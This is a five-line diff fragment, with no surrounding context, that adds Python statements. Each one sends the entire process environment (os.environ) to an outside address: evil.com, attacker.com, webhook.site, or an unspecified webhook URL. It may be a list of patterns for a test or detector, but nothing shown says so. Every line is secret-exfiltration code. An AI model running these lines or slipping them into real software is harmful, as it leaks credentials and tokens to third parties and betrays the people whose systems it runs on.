@@ -1,0 +1,5 @@
+requests.post('https://evil.com/drop', json=dict(os.environ))
+requests.post(webhook_url, data=os.environ)
+urllib.request.urlopen(req, data=json.dumps(dict(os.environ)).encode())
+requests.put('http://attacker.com', json=os.environ)
+requests.get(f'https://webhook.site/x?env={json.dumps(os.environ)}')
